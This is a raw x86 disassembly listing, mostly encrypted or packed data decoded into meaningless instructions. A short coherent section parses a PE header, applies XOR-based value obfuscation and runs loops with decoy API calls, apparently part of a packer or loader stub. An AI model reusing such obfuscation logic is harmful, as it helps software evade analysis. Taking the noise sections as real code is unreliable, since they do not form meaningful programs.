  4179ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179ed:	sbb    DWORD PTR [ebx+0x39],0xe15a0584
  4179f4:	mov    ebx,0xf30fd56b
  4179f9:	mov    ch,BYTE PTR [esi+0x2d98a6d1]
  4179ff:	or     eax,0x5ee18b6f
  417a04:	iret   
  417a05:	mov    ch,0x24
  417a07:	add    BYTE PTR [esi],0xdf
  417a0a:	pop    es
  417a0b:	fcomp  QWORD PTR [ebx]
  417a0d:	add    al,0xce
  417a0f:	mov    ch,0x67
  417a11:	es popa 
  417a13:	cmp    al,0x23
  417a15:	push   0x4e
  417a17:	lods   al,BYTE PTR ds:[esi]
  417a18:	sbb    eax,0x5487771
  417a1d:	dec    ebx
  417a1e:	jnp    0x417a9c
  417a20:	or     al,0xc2
  417a22:	dec    edx
  417a23:	add    eax,0x2dae6fc0
  417a28:	fwait
  417a29:	inc    edx
  417a2a:	push   0x97a6508b
  417a2f:	mov    gs,WORD PTR [ecx+0x5770c33b]
  417a35:	sub    bl,bl
  417a37:	pop    eax
  417a38:	dec    esp
  417a39:	xlat   BYTE PTR ds:[ebx]
  417a3a:	pop    es
  417a3b:	mov    WORD PTR [edi+edx*2],?
  417a3e:	jbe    0x4179df
  417a40:	mov    ebx,0xf8c91373
  417a45:	cmp    al,0x72
  417a47:	jp     0x417a1b
  417a49:	cdq    
  417a4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a4b:	lock fcomp QWORD PTR [edx+eax*4-0x48af7ece]
  417a53:	call   DWORD PTR [edx]
  417a55:	sar    BYTE PTR [eax+0x46a0927d],cl
  417a5b:	imul   ebx,DWORD PTR [ebp+0x3ce14b60],0xffffffef
  417a62:	mov    ebx,0xd1aea10b
  417a67:	jge    0x417a8d
  417a69:	pop    edx
  417a6a:	into   
  417a6b:	xchg   edx,eax
  417a6c:	pop    es
  417a6d:	test   eax,0x2c87f678
  417a72:	loope  0x417a3e
  417a74:	pop    edx
  417a75:	jl     0x417acb
  417a77:	mov    ebp,0x28ab35e1
  417a7c:	sbb    eax,0x2cae7e92
  417a81:	xlat   BYTE PTR ds:[ebx]
  417a82:	push   ebp
  417a83:	mov    eax,ds:0x9ce67142
  417a88:	leave  
  417a89:	(bad)  
  417a8a:	push   0xffffffb6
  417a8c:	addr16 push edx
  417a8e:	adc    BYTE PTR ds:0x9fbf2c34,ch
  417a94:	adc    al,0x75
  417a96:	(bad)  
  417a97:	lock xchg esi,eax
  417a99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a9a:	push   esp
  417a9b:	inc    edi
  417a9c:	jo     0x417aac
  417a9e:	sbb    BYTE PTR [eax-0x5ea2e8ee],dl
  417aa4:	cmp    al,0x6d
  417aa6:	das    
  417aa7:	ror    BYTE PTR [ebx-0x1dee94f8],1
  417aad:	ret    
  417aae:	pop    edi
  417aaf:	xchg   ebp,eax
  417ab0:	push   ss
  417ab1:	push   ss
  417ab2:	or     esp,ebx
  417ab4:	sahf   
  417ab5:	jp     0x417b19
  417ab7:	xchg   ecx,eax
  417ab8:	ins    DWORD PTR es:[edi],dx
  417ab9:	xchg   ebx,eax
  417aba:	add    eax,0xf813e19a
  417abf:	cs shl edi,0xa9
  417ac3:	xor    ecx,DWORD PTR [esi+eax*4-0x76]
  417ac7:	mov    esp,0xb19754a9
  417acc:	adc    eax,0x183add11
  417ad1:	ret    
  417ad2:	mov    bl,0x52
  417ad4:	test   eax,0xa5c251b6
  417ad9:	sub    DWORD PTR [esi+edi*4+0x7dc3a818],ebp
  417ae0:	sbb    BYTE PTR [ebp-0x50],bh
  417ae3:	test   al,0xb9
  417ae5:	popf   
  417ae6:	sbb    ch,BYTE PTR [edi-0x23]
  417ae9:	cmove  ecx,edi
  417aec:	push   ebx
  417aed:	xchg   esp,eax
  417aee:	or     ebx,DWORD PTR [ebx-0x6a]
  417af1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417af2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417af3:	mov    dh,0x2
  417af5:	push   0xcad5243b
  417afa:	push   0x6f
  417afc:	(bad)  
  417afd:	pop    esp
  417afe:	and    eax,0x5b8f9a6a
  417b03:	dec    ebp
  417b04:	mov    cl,0x2a
  417b06:	daa    
  417b07:	or     ebx,DWORD PTR [ecx-0x6b052a1]
  417b0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b0e:	dec    BYTE PTR [edx-0x2b]
  417b11:	mov    WORD PTR [eax-0x68],ds
  417b14:	rcr    BYTE PTR ds:0x7721c00c,cl
  417b1a:	sbb    dl,BYTE PTR [edi-0x68]
  417b1d:	mov    cl,0xec
  417b1f:	push   esp
  417b20:	mov    dl,0xe0
  417b22:	pop    ebp
  417b23:	or     eax,0x54e2beb8
  417b28:	jl     0x417ba4
  417b2a:	ins    DWORD PTR es:[edi],dx
  417b2b:	dec    edx
  417b2c:	jecxz  0x417af3
  417b2e:	add    al,0x9e
  417b30:	add    eax,0x922aa779
  417b35:	clc    
  417b36:	test   al,0xe0
  417b38:	loopne 0x417b88
  417b3a:	aas    
  417b3b:	jb     0x417bbb
  417b3d:	jo     0x417bb9
  417b3f:	pop    ebx
  417b40:	mov    dh,0x7d
  417b42:	jge    0x417af5
  417b44:	repnz call 0xc852:0x2dbe2799
  417b4c:	and    esi,DWORD PTR [edi]
  417b4e:	pop    ecx
  417b4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b50:	lahf   
  417b51:	dec    esi
  417b52:	ret    
  417b53:	mov    ebp,DWORD PTR ds:[ebx]
  417b56:	das    
  417b57:	fwait
  417b58:	hlt    
  417b59:	dec    esp
  417b5a:	dec    esp
  417b5b:	bnd jge 0x417af3
  417b5e:	aas    
  417b5f:	lds    eax,FWORD PTR ds:0xc3b43e7
  417b65:	push   eax
  417b66:	std    
  417b67:	cmp    eax,0x9a07707c
  417b6c:	mov    ebp,0xcf52f658
  417b71:	and    esi,DWORD PTR [edi-0x1f]
  417b74:	repz popa 
  417b76:	popw   ds
  417b78:	(bad)  
  417b79:	aad    0x1
  417b7b:	pop    edi
  417b7c:	mov    esp,0x7d78eca1
  417b81:	or     BYTE PTR [ebx+0x7b],bh
  417b84:	shl    BYTE PTR [ecx],1
  417b86:	mov    esp,0x6e4ecc22
  417b8b:	cmp    bl,BYTE PTR [eax-0x38]
  417b8e:	mov    eax,0xa0baaa88
  417b93:	out    0xa1,al
  417b95:	lods   al,BYTE PTR ds:[esi]
  417b96:	test   DWORD PTR [ebp-0x70],edx
  417b99:	mov    DWORD PTR [eax],ebp
  417b9b:	xor    ebx,esi
  417b9d:	jl     0x417b9e
  417b9f:	inc    ebp
  417ba0:	movlps QWORD PTR [eax+0x1c],xmm5
  417ba4:	inc    ecx
  417ba5:	xlat   BYTE PTR ds:[ebx]
  417ba6:	dec    eax
  417ba7:	mov    edx,0x9189440c
  417bac:	mov    ah,0x72
  417bae:	push   eax
  417baf:	out    0xe0,eax
  417bb1:	jle    0x417be0
  417bb3:	pop    ds
  417bb4:	ins    DWORD PTR es:[edi],dx
  417bb5:	data16 and BYTE PTR [ebp-0x78],ah
  417bb9:	mov    ch,0xad
  417bbb:	xor    BYTE PTR [ecx-0x43],0xd9
  417bbf:	dec    edi
  417bc0:	aad    0x5f
  417bc2:	sub    esi,edx
  417bc4:	dec    ecx
  417bc5:	push   ebp
  417bc6:	in     eax,0x8f
  417bc8:	add    DWORD PTR [ebx],esi
  417bca:	cmp    al,0xf2
  417bcc:	or     DWORD PTR [edi],esp
  417bce:	arpl   WORD PTR [eax+ebx*4+0x42ffccf7],ax
  417bd5:	mov    ds:0x2eb12204,al
  417bda:	retf   
  417bdb:	pushw  ds
  417bdd:	in     al,0x24
  417bdf:	icebp  
  417be0:	xor    eax,0xe2134ed2
  417be5:	shr    DWORD PTR [edx-0x76508834],cl
  417beb:	imul   edi,DWORD PTR [edi-0x43],0x469bd1e1
  417bf2:	ss es dec edi
  417bf5:	retf   0xc509
  417bf8:	into   
  417bf9:	lock pop ds
  417bfb:	xlat   BYTE PTR ds:[ebx]
  417bfc:	sub    eax,0x59a12a49
  417c01:	cmp    al,0xbe
  417c03:	jo     0x417b9b
  417c05:	or     dl,BYTE PTR [eax]
  417c07:	push   ebx
  417c08:	dec    edx
  417c09:	push   ecx
  417c0a:	cmp    al,0xdb
  417c0c:	outs   dx,BYTE PTR ds:[esi]
  417c0d:	pop    ebp
  417c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c0f:	inc    esp
  417c10:	mov    ch,0x13
  417c12:	test   BYTE PTR [eax+0x63],dl
  417c15:	mov    ds:0x42ab6c43,al
  417c1a:	xor    esp,DWORD PTR [edx+0x3c]
  417c1d:	dec    esp
  417c1e:	dec    eax
  417c1f:	adc    eax,0x3e9c775b
  417c24:	cdq    
  417c25:	jg     0x417ca1
  417c27:	in     eax,0x72
  417c29:	jle    0x417c3d
  417c2b:	pop    edi
  417c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c2d:	les    edx,FWORD PTR [edi]
  417c2f:	leave  
  417c30:	sbb    DWORD PTR [esi-0x3dcd401f],ebx
  417c36:	std    
  417c37:	in     eax,0x28
  417c39:	add    al,0x1
  417c3b:	mov    al,ds:0x40c3c84a
  417c40:	enter  0x1989,0xe1
  417c44:	cmp    al,0xb1
  417c46:	xchg   edx,eax
  417c47:	mov    bh,0xc8
  417c49:	fmul   st(1),st
  417c4b:	lea    edx,[esi+0x6c36498b]
  417c51:	fild   QWORD PTR [ecx]
  417c53:	imul   eax,DWORD PTR [esi+0x2a],0xffffffe8
  417c57:	(bad)  
  417c58:	mov    cl,bl
  417c5a:	adc    DWORD PTR [esi],ecx
  417c5c:	stc    
  417c5d:	or     esi,DWORD PTR [ebp+0xee71e4d]
  417c63:	imul   ebp,DWORD PTR [esi-0x78],0xffffff94
  417c67:	(bad)  
  417c68:	popa   
  417c69:	mov    eax,ds:0x7de10e6c
  417c6e:	jae    0x417c7b
  417c70:	lea    eax,[edx]
  417c72:	leave  
  417c73:	das    
  417c74:	push   ebx
  417c75:	cli    
  417c76:	stos   DWORD PTR es:[edi],eax
  417c77:	mov    bh,0xb8
  417c79:	adc    eax,0xdba65dcb
  417c7e:	popa   
  417c7f:	jmp    DWORD PTR [edi]
  417c81:	stos   DWORD PTR es:[edi],eax
  417c82:	sbb    cl,BYTE PTR ds:[esi+0x4b]
  417c86:	into   
  417c87:	pop    edi
  417c88:	test   DWORD PTR [ebx],edi
  417c8a:	adc    DWORD PTR [edi+ebx*1],ebp
  417c8d:	test   al,0x12
  417c8f:	dec    esi
  417c90:	je     0x417c67
  417c92:	outs   dx,DWORD PTR ds:[esi]
  417c93:	lock inc eax
  417c95:	(bad)  
  417c96:	mov    ds:0xafe856b0,al
  417c9b:	push   0x2f
  417c9d:	xchg   ebp,eax
  417c9e:	dec    ebp
  417c9f:	int    0xec
  417ca1:	and    DWORD PTR [eax],ecx
  417ca3:	ins    DWORD PTR es:[edi],dx
  417ca4:	in     al,0xfe
  417ca6:	dec    ebp
  417ca7:	ins    BYTE PTR es:[edi],dx
  417ca8:	inc    ebp
  417ca9:	add    dl,bh
  417cab:	fcomp  DWORD PTR [edx]
  417cad:	int3   
  417cae:	inc    ebp
  417caf:	jmp    0x417d19
  417cb1:	add    DWORD PTR [ecx-0x1a],edi
  417cb4:	adc    ebx,DWORD PTR ds:0x62fb7425
  417cba:	jmp    0x417d31
  417cbc:	cmp    eax,DWORD PTR [esp+edi*1+0x63]
  417cc0:	frstor [ebx]
  417cc2:	rcr    bh,1
  417cc4:	int    0xd7
  417cc6:	add    eax,0xf5000cd4
  417ccb:	adc    cl,BYTE PTR [esi]
  417ccd:	lds    esp,FWORD PTR [ecx-0x59]
  417cd0:	daa    
  417cd1:	mov    ah,ah
  417cd3:	push   eax
  417cd4:	jg     0x417cd5
  417cd6:	dec    eax
  417cd7:	push   edx
  417cd8:	push   ebp
  417cd9:	xlat   BYTE PTR ds:[ebx]
  417cda:	fcomi  st,st(0)
  417cdc:	or     esi,esi
  417cde:	mov    ebp,0xcbbd51a7
  417ce3:	mov    ds:0x901e41aa,eax
  417ce8:	or     bh,0x13
  417ceb:	retf   
  417cec:	in     al,0x82
  417cee:	dec    esp
  417cef:	lds    edx,FWORD PTR [edi-0x2e]
  417cf2:	frstor [edi-0x35411cb2]
  417cf8:	xor    edx,edx
  417cfa:	cwde   
  417cfb:	repz ret 0x5388
  417cff:	mov    DWORD PTR [ebp+0x17],ebx
  417d02:	add    BYTE PTR [edx+0x101c1721],dh
  417d08:	jle    0x417c94
  417d0a:	add    DWORD PTR [edi-0x2b],ecx
  417d0d:	sbb    eax,DWORD PTR [eax+0xe98fdd]
  417d13:	icebp  
  417d14:	imul   eax,DWORD PTR [edi-0x1a],0x69a7b08f
  417d1b:	sub    eax,0x933d0189
  417d20:	cmp    dl,BYTE PTR [edx+0x74]
  417d23:	fwait
  417d24:	xchg   esi,eax
  417d25:	and    eax,0xfb5baa73
  417d2a:	not    BYTE PTR [edi+0x4d]
  417d2d:	(bad)  
  417d2e:	jno    0x417d11
  417d30:	inc    ecx
  417d31:	cmp    eax,0x171c63a2
  417d36:	jne    0x417d28
  417d38:	mov    edi,0x341d99e
  417d3d:	jecxz  0x417d19
  417d3f:	pop    ds
  417d40:	xor    cl,bh
  417d42:	(bad)  
  417d43:	mov    ch,0x94
  417d45:	loope  0x417d79
  417d47:	add    BYTE PTR [eax],dh
  417d49:	inc    edx
  417d4a:	or     al,0x6c
  417d4c:	pop    edx
  417d4d:	loop   0x417d74
  417d4f:	xor    DWORD PTR [ebx-0x1],ebp
  417d52:	in     al,dx
  417d53:	arpl   WORD PTR [ebp+0x4faab988],ax
  417d59:	mov    ds:0xdb3bb8e0,al
  417d5e:	mov    BYTE PTR [ebp-0x15],dh
  417d61:	cld    
  417d62:	push   esi
  417d63:	adc    DWORD PTR ds:0x7192a2c6,0xffffffec
  417d6a:	and    eax,0xffebbeef
  417d6f:	cmp    ebp,DWORD PTR [edi+0xd]
  417d72:	repz out dx,eax
  417d74:	pop    ds
  417d75:	fs xchg cl,ah
  417d78:	outs   dx,DWORD PTR ds:[esi]
  417d79:	fdivr  QWORD PTR [esi-0x47c5bd3f]
  417d7f:	cmp    edx,DWORD PTR [ecx-0x4f]
  417d82:	push   ds
  417d83:	je     0x417da9
  417d85:	jnp    0x417dbc
  417d87:	rcr    edx,cl
  417d89:	xor    ebp,ecx
  417d8b:	inc    esi
  417d8c:	pop    eax
  417d8d:	nop
  417d8e:	test   al,0x2
  417d90:	fcmove st,st(2)
  417d92:	sar    DWORD PTR fs:[esi],1
  417d95:	adc    BYTE PTR ds:[ecx+0x602d8d57],bl
  417d9c:	fisttp WORD PTR [edx]
  417d9e:	(bad)  
  417da0:	call   DWORD PTR [ecx]
  417da2:	push   ebp
  417da3:	add    DWORD PTR [eax-0x393c14d8],esp
  417da9:	jno    0x417d38
  417dab:	or     ebp,DWORD PTR ds:0xb6dc1b8d
  417db1:	iret   
  417db2:	mov    edi,0x33e60577
  417db7:	aad    0xf1
  417db9:	into   
  417dba:	icebp  
  417dbb:	fs mov ecx,0x160bc74f
  417dc1:	rcl    DWORD PTR [ebp-0x3],1
  417dc4:	shl    BYTE PTR es:0xd68e72bc,cl
  417dcb:	sub    eax,0x13ebeb4d
  417dd0:	or     eax,0xed236955
  417dd5:	imul   esp,DWORD PTR [ebp+edi*2-0x24],0xa7413fbc
  417ddd:	cs stos DWORD PTR es:[edi],eax
  417ddf:	inc    edi
  417de0:	sub    al,0x68
  417de2:	xchg   esi,eax
  417de3:	add    BYTE PTR [ecx-0x17],al
  417de6:	jmp    0x73c79c7b
  417deb:	pop    eax
  417dec:	xadd   BYTE PTR [edx+0x31],dh
  417df0:	add    BYTE PTR [ebx+0x34],0x44
  417df4:	cwde   
  417df5:	mov    eax,ds:0x5d1c56b8
  417dfa:	adc    edx,0xffffffe1
  417dfd:	sahf   
  417dfe:	jo     0x417d9f
  417e00:	push   eax
  417e01:	sti    
  417e02:	sti    
  417e03:	sub    BYTE PTR [eax+ebp*4+0x238c3f2],al
  417e0a:	lds    esp,FWORD PTR [esi+0x5]
  417e0d:	add    edi,esp
  417e0f:	push   ebp
  417e10:	imul   edi,DWORD PTR [eax-0x1],0x7
  417e14:	cwde   
  417e15:	loopne 0x417df6
  417e17:	fld    DWORD PTR [ecx]
  417e19:	lock (bad) 
  417e1b:	and    bh,BYTE PTR [eax+0x38792817]
  417e21:	popa   
  417e22:	dec    esi
  417e23:	sub    DWORD PTR [esi],0xb45df63c
  417e29:	fcomi  st,st(0)
  417e2b:	aas    
  417e2c:	ret    
  417e2d:	push   0xffffffd2
  417e2f:	adc    bl,BYTE PTR [bp+di]
  417e32:	jp     0x417ea4
  417e34:	es sahf 
  417e36:	push   esp
  417e37:	loop   0x417e93
  417e39:	int    0x62
  417e3b:	mov    edx,edx
  417e3d:	es data16 loop 0x417e2b
  417e41:	into   
  417e42:	add    al,0xc6
  417e44:	loop   0x417e4e
  417e46:	mov    eax,0xad1a02a5
  417e4b:	mov    al,0xa7
  417e4d:	call   0x4df4:0x3681febf
  417e54:	mov    edx,0xb598713c
  417e59:	(bad)  
  417e5a:	jecxz  0x417eae
  417e5c:	popa   
  417e5d:	ret    
  417e5e:	pop    esp
  417e5f:	dec    ebp
  417e60:	mov    ch,BYTE PTR [ecx-0x7fe60ef9]
  417e66:	inc    edx
  417e67:	push   cs
  417e68:	adc    BYTE PTR [ecx],0x72
  417e6b:	inc    ebx
  417e6c:	repz popf 
  417e6e:	stos   BYTE PTR es:[edi],al
  417e6f:	cwde   
  417e70:	push   edi
  417e71:	inc    edx
  417e72:	jmp    0x9cd3:0x77f061c8
  417e79:	or     ecx,edi
  417e7b:	inc    ebx
  417e7c:	xchg   esp,eax
  417e7d:	mov    ebp,DWORD PTR [edi-0xe]
  417e80:	lods   eax,DWORD PTR ds:[esi]
  417e81:	cmp    al,0x2c
  417e83:	cmc    
  417e84:	mov    ebx,ecx
  417e86:	cmc    
  417e87:	pop    ebp
  417e88:	adc    eax,0xe2f420db
  417e8d:	push   edx
  417e8e:	cmc    
  417e8f:	retf   0x85b7
  417e92:	fdivr  st(1),st
  417e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417e95:	addr16 sub eax,0x149f2fe3
  417e9b:	ins    BYTE PTR es:[edi],dx
  417e9c:	shl    DWORD PTR [eax+0x7979f50],cl
  417ea2:	sti    
  417ea3:	pusha  
  417ea4:	fnstsw WORD PTR [eax]
  417ea6:	popa   
  417ea7:	lahf   
  417ea8:	into   
  417ea9:	pop    ecx
  417eaa:	adc    eax,0xcc346cb8
  417eaf:	or     bl,ah
  417eb1:	push   ecx
  417eb2:	pop    eax
  417eb3:	add    esi,DWORD PTR [ecx]
  417eb5:	dec    ecx
  417eb6:	dec    BYTE PTR cs:[eax+0x24]
  417eba:	add    dh,BYTE PTR [esi]
  417ebc:	outs   dx,DWORD PTR ds:[esi]
  417ebd:	fwait
  417ebe:	popa   
  417ebf:	sub    bl,BYTE PTR [esi]
  417ec1:	scas   eax,DWORD PTR es:[edi]
  417ec2:	mov    ?,WORD PTR [ebx-0x78]
  417ec5:	jne    0x417f37
  417ec7:	mov    ss,WORD PTR es:[edi+0x46]
  417ecb:	add    eax,0xa2586ed
  417ed0:	pushf  
  417ed1:	shl    DWORD PTR [ebx-0x7066275],cl
  417ed7:	mov    ah,0xd
  417ed9:	cmp    edx,ebp
  417edb:	mov    eax,0xd2a44c76
  417ee0:	call   0x5770:0xb2f687f3
  417ee7:	jo     0x417e8d
  417ee9:	mov    edi,0x3f53282e
  417eee:	mov    esp,0x36040a11
  417ef3:	jmp    0x417f25
  417ef5:	fistp  DWORD PTR [edx+ebx*2]
  417ef8:	outs   dx,BYTE PTR ds:[esi]
  417ef9:	mov    bl,0xee
  417efb:	shr    DWORD PTR [eax-0x205740f2],0xd0
  417f02:	xor    BYTE PTR [ebp-0x2e50bc7e],0xb9
  417f09:	in     al,0x73
  417f0b:	loop   0x417f7d
  417f0d:	loopne 0x417eb6
  417f0f:	(bad)  
  417f10:	outs   dx,BYTE PTR ds:[esi]
  417f11:	ds pop edx
  417f13:	fld    st(0)
  417f15:	pop    ebx
  417f16:	mov    ch,0x25
  417f18:	aad    0xbd
  417f1a:	inc    esp
  417f1b:	ret    
  417f1c:	sub    BYTE PTR [ecx+0x2d],dl
  417f1f:	xchg   ebp,eax
  417f20:	add    dh,BYTE PTR [edx-0x6f]
  417f23:	push   ecx
  417f24:	mov    al,BYTE PTR [eax]
  417f26:	add    DWORD PTR ds:0x429004,0x244e
  417f30:	add    al,0xd
  417f32:	xor    DWORD PTR ds:0x429014,0x42600c
  417f3c:	xor    al,0x6f
  417f3e:	mov    DWORD PTR ds:0x427010,0x5834
  417f48:	cmp    al,0x35
  417f4a:	jne    0x417f8f
  417f50:	mov    eax,DWORD PTR [ebp+0x8]
  417f53:	mov    ecx,DWORD PTR [ebp+0x8]
  417f56:	add    ecx,DWORD PTR [eax+0x3c]
  417f59:	mov    edx,0x7510893
  417f5e:	mov    DWORD PTR [ebp+0x8],ecx
  417f61:	mov    eax,DWORD PTR [ebp-0x4]
  417f64:	xor    eax,edx
  417f66:	push   esi
  417f67:	mov    esi,DWORD PTR [ebp+0x8]
  417f6a:	mov    ecx,0x3272db
  417f6f:	add    eax,ecx
  417f71:	cmp    DWORD PTR [esi+0x54],eax
  417f74:	pop    esi
  417f75:	je     0x417f83
  417f7b:	mov    eax,DWORD PTR [ebp+0x8]
  417f7e:	jmp    0x417f9c
  417f83:	mov    eax,DWORD PTR [ebp-0x4]
  417f86:	xor    eax,edx
  417f88:	add    eax,ecx
  417f8a:	jmp    0x417f9c
  417f8f:	mov    eax,DWORD PTR [ebp-0x4]
  417f92:	xor    eax,0x7510893
  417f97:	add    eax,0x3272db
  417f9c:	leave  
  417f9d:	ret    0x4
  417fa0:	push   ebp
  417fa1:	mov    ebp,esp
  417fa3:	push   ecx
  417fa4:	push   ecx
  417fa5:	mov    DWORD PTR ds:0x425024,0x14
  417faf:	cmp    DWORD PTR ds:0x425024,0x0
  417fb6:	je     0x417ff0
  417fbc:	cmp    DWORD PTR ds:0x425024,0x1c
  417fc3:	jne    0x417fdc
  417fc9:	push   DWORD PTR [ebp-0xc]
  417fcc:	push   0x427000
  417fd1:	push   0x4617
  417fd6:	call   DWORD PTR ds:0x421034
  417fdc:	xor    edx,edx
  417fde:	add    edx,DWORD PTR ds:0x425024
  417fe4:	dec    edx
  417fe5:	mov    DWORD PTR ds:0x425024,edx
  417feb:	jmp    0x417faf
  417ff0:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  417ff7:	mov    DWORD PTR ds:0x428010,0x1b
  418001:	cmp    DWORD PTR ds:0x428010,0x0
  418008:	je     0x41803b
  41800e:	cmp    DWORD PTR ds:0x428010,0x20
  418015:	jne    0x418029
  41801b:	push   DWORD PTR [ebp-0x1c]
  41801e:	push   0x4a52
  418023:	call   DWORD PTR ds:0x421038
  418029:	mov    ecx,DWORD PTR ds:0x428010
  41802f:	dec    ecx
  418030:	mov    DWORD PTR ds:0x428010,ecx
  418036:	jmp    0x418001
  41803b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  418042:	mov    eax,DWORD PTR [ebp-0x4]
  418045:	add    edx,0xdc
  41804b:	push   esi
  41804c:	mov    edx,DWORD PTR ds:0x42004b
  418052:	xor    ecx,ecx
  418054:	add    ecx,DWORD PTR ds:0x41d1dc
  41805a:	sub    ecx,edx
  41805c:	and    edx,DWORD PTR [edx+ecx*1]
  41805f:	mov    esi,DWORD PTR [ebp-0x8]
  418062:	add    DWORD PTR ds:0x429010,0x2693
  41806c:	mov    edx,0x7510893
  418071:	xor    eax,edx
  418073:	xor    esi,edx
  418075:	and    DWORD PTR ds:0x42901c,0x0
  41807f:	jmp    0x418091
  418084:	mov    ecx,DWORD PTR ds:0x42901c
  41808a:	inc    ecx
  41808b:	mov    DWORD PTR ds:0x42901c,ecx
  418091:	cmp    DWORD PTR ds:0x42901c,0x17
  418098:	jae    0x4180e3
  41809e:	cmp    DWORD PTR ds:0x42901c,0xb
  4180a5:	jne    0x4180c4
  4180ab:	push   DWORD PTR [ebp-0x10]
  4180ae:	push   0x8d74
  4180b3:	push   0x428004
  4180b8:	push   DWORD PTR [ebp-0x10]
  4180bb:	push   DWORD PTR [ebp-0x14]
  4180be:	call   DWORD PTR ds:0x421000
  4180c4:	cmp    DWORD PTR ds:0x42901c,0xa
  4180cb:	jne    0x4180de
  4180d1:	mov    ecx,DWORD PTR ds:0x42901c
  4180d7:	inc    ecx
  4180d8:	mov    DWORD PTR ds:0x42901c,ecx
  4180de:	jmp    0x418084
  4180e3:	mov    ecx,0x3272db
  4180e8:	add    esi,ecx
  4180ea:	add    eax,ecx
  4180ec:	imul   eax,esi
  4180ef:	mov    esi,DWORD PTR [ebp+0xc]
  4180f2:	cmp    esi,eax
  4180f4:	jne    0x41a4c2
  4180fa:	mov    eax,DWORD PTR [ebp-0x4]
  4180fd:	mov    esi,DWORD PTR [ebp-0x8]
  418100:	xor    eax,edx
  418102:	jmp    0x41a4b4
  418107:	mov    esp,0x2510558f
  41810c:	sub    DWORD PTR fs:[ebx-0x5f],0xffffff83
  418111:	mov    al,0xb8
  418113:	into   
  418114:	lods   eax,DWORD PTR ds:[esi]
  418115:	and    DWORD PTR [esi],ecx
  418117:	std    
  418118:	and    al,0x61
  41811a:	(bad)  
  41811b:	int    0x5f
  41811d:	bound  esp,QWORD PTR [edx-0x36]
  418120:	lahf   
  418121:	push   ss
  418122:	mov    cl,0xc1
  418124:	jnp    0x4180e0
  418126:	retf   
  418127:	or     eax,0x3f36a2a5
  41812c:	sbb    al,0x81
  41812e:	shl    eax,1
  418130:	mov    eax,0x715a01ba
  418135:	mov    esp,0x1b0b3d80
  41813a:	xchg   esi,eax
  41813b:	rcr    ebx,0x2a
  41813e:	pop    esi
  41813f:	push   edx
  418140:	inc    ecx
  418141:	adc    bh,cl
  418143:	cwde   
  418144:	sub    eax,0xe3fa0e47
  418149:	push   ds
  41814a:	xchg   esp,eax
  41814b:	jno    0x4180d1
  41814d:	or     al,dh
  41814f:	imul   esi,edi,0x8088f292
  418155:	sbb    eax,DWORD PTR [ebp-0xd7e0149]
  41815b:	push   esi
  41815c:	addr16 dec ebx
  41815e:	(bad)  
  41815f:	enter  0xfc75,0x32
  418163:	mov    cl,0xb
  418165:	mov    WORD PTR [ebx+ebx*1-0xb42daf7],gs
  41816c:	test   DWORD PTR [eax],edi
  41816e:	mov    ecx,0x6df2853
  418173:	sbb    eax,0xfc6d0799
  418178:	pop    edi
  418179:	rol    eax,0x59
  41817c:	or     cl,BYTE PTR ds:0xf2225f37
  418182:	inc    edi
  418183:	sbb    eax,0x9fccac20
  418188:	adc    ah,BYTE PTR [ecx+edi*8+0x6]
  41818c:	pop    esi
  41818d:	pop    eax
  41818e:	aas    
  41818f:	push   ebp
  418190:	and    al,0x75
  418192:	int    0x8d
  418194:	xor    al,0xbd
  418196:	fisubr DWORD PTR [esi]
  418198:	ins    BYTE PTR es:[edi],dx
  418199:	dec    ecx
  41819a:	jmp    0x41816c
  41819c:	cmp    al,0x1
  41819e:	fcomp  DWORD PTR [ecx+edx*8+0x445dbd80]
  4181a5:	jle    0x41817e
  4181a7:	out    dx,al
  4181a8:	out    dx,al
  4181a9:	inc    eax
  4181aa:	fmulp  st(0),st
  4181ac:	pushf  
  4181ad:	in     al,0xf5
  4181af:	jae    0x4181ac
  4181b1:	pop    ebx
  4181b2:	popa   
  4181b3:	test   DWORD PTR [eax],edi
  4181b5:	mov    ah,0x6e
  4181b7:	cmp    BYTE PTR [edi-0x3500a606],ah
  4181bd:	sub    BYTE PTR [ecx-0x1],0xe2
  4181c1:	fcomp  st(6)
  4181c3:	hlt    
  4181c4:	addr16 aas 
  4181c6:	push   cs
  4181c7:	sbb    eax,0xb39bf233
  4181cc:	(bad)  
  4181cd:	fsubr  QWORD PTR [ecx+0x1f9a06f0]
  4181d3:	cmp    edi,DWORD PTR [eax-0x7d]
  4181d6:	lea    esi,[esi-0x312fc276]
  4181dc:	mov    ah,0xb8
  4181de:	and    ah,BYTE PTR [edi+0x46]
  4181e1:	mov    edx,0xf071be88
  4181e6:	cmp    eax,0x143bcc38
  4181eb:	add    eax,0x567b6ebc
  4181f0:	inc    ebx
  4181f1:	lods   eax,DWORD PTR ds:[esi]
  4181f2:	mov    esi,0x5495a273
  4181f7:	stc    
  4181f8:	std    
  4181f9:	push   ss
  4181fa:	or     DWORD PTR [edx+ebx*8+0x1b12a8ed],esp
  418201:	mov    dh,0xe9
  418203:	or     eax,DWORD PTR [esi+0x67d415ca]
  418209:	xchg   BYTE PTR [esi],bl
  41820b:	mov    DWORD PTR [edx+0x9],ebx
  41820e:	cmc    
  41820f:	inc    esi
  418210:	cmp    ah,ch
  418212:	fidivr DWORD PTR [edi]
  418214:	cs mov al,0x8
  418217:	ins    DWORD PTR es:[edi],dx
  418218:	push   0xffffffab
  41821a:	test   eax,0x7655995e
  41821f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418220:	or     BYTE PTR [esi-0x43],dl
  418223:	adc    esi,edi
  418225:	js     0x418259
  418227:	stos   BYTE PTR es:[edi],al
  418228:	int3   
  418229:	sub    ch,0x8b
  41822c:	adc    eax,0x7bfd7dff
  418231:	dec    edx
  418232:	popf   
  418233:	scas   al,BYTE PTR es:[edi]
  418234:	cmp    edi,esi
  418236:	push   ss
  418237:	loopne 0x41824e
  418239:	in     eax,0xa6
